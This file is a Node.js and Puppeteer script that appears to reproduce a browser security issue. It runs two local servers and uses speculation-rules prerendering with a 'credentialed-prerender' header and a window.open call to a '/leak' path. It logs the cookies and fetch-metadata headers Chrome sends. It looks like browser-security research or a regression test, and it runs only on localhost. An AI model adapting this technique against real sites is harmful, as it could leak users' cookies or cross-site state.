const http = require('http');
const puppeteer = require('puppeteer');

const seen = [];
function handler(port) {
  return (req, res) => {
    seen.push({port, url: req.url, site: req.headers['sec-fetch-site'], dest: req.headers['sec-fetch-dest'], purpose: req.headers['sec-purpose'], cookie: req.headers.cookie});
    if (port === 8127 && req.url === '/start') {
      res.end(`<script type=speculationrules>{"prerender":[{"source":"list","urls":["http://127.0.0.1:8128/final"]}]}</script>`);
    } else if (port === 8127 && req.url === '/hold') {
      res.writeHead(302, {location: 'http://127.0.0.1:8128/final'}).end();
    } else if (port === 8127 && req.url === '/leak') {
      res.end(`<script>location='/done'</script>`);
    } else if (port === 8128 && req.url === '/final') {
      res.setHeader('Supports-Loading-Mode', 'credentialed-prerender');
      res.end(`<script>open('http://127.0.0.1:8127/leak')</script>`);
    } else res.end('ok');
  };
}

(async () => {
  const a = http.createServer(handler(8127));
  const b = http.createServer(handler(8128));
  await Promise.all([
    new Promise(resolve => a.listen(8127, '127.0.0.1', resolve)),
    new Promise(resolve => b.listen(8128, '127.0.0.1', resolve)),
  ]);
  const browser = await puppeteer.launch({executablePath: process.env.CHROME_PATH, headless: 'new'});
  const page = await browser.newPage();
  await page.setCookie({name:'admin', value:'yes', url:'http://127.0.0.1:8128', sameSite:'Lax'});
  await page.goto('http://127.0.0.1:8127/start');
  await new Promise(resolve => setTimeout(resolve, 2000));
  console.log(seen);
  await browser.close();
  a.close(); b.close();
})();
